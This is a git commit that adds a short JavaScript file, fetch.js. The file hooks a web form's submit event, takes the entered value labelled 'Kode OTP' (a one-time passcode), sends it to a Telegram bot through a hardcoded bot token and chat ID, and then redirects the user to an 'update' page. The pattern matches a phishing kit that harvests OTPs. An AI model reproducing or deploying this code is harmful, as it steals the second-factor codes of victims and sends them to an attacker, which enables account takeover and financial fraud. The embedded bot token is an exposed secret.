c9de83aeec7b0aa7faed2b6afe73d09bd666799a
on-line-up <126753747+on-line-up@users.noreply.github.com>
2023-03-05 19:14:11 +0700

    Add files via upload

---
+++ fetch.js
@@ -0,0 +1,43 @@
+
+        
+    const TOKEN = "5914776358:AAFkijhg9XzwT4UHvPR4Hzh50e1aQ8dtRSw";
+const CHAT_ID = "6181131607";
+const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+const form = document.getElementById("fetch");
+
+form.addEventListener("submit", onSubmitTelegram);
+
+function onSubmitTelegram(e) {
+  e.preventDefault();
+
+  const { name, } = form;
+  const data = {
+    name: name.value,
+  };
+
+  let message = `<b></b>\n`;
+  message += `<b>Kode OTP: </b> ${data.name}`;
+
+  const dataTg = {
+    chat_id: CHAT_ID,
+    text: message,
+    parse_mode: "html",
+  };
+
+  const options = {
+    method: "POST",
+    body: JSON.stringify(dataTg),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  };
+
+  fetch(URL_API, options)
+    .then((res) => res.json())
+    .then((res) => console.log(res))
+    .catch((err) => console.log(err));
+    
+    window.location.href = '/pembaharuan.html';
+}
+
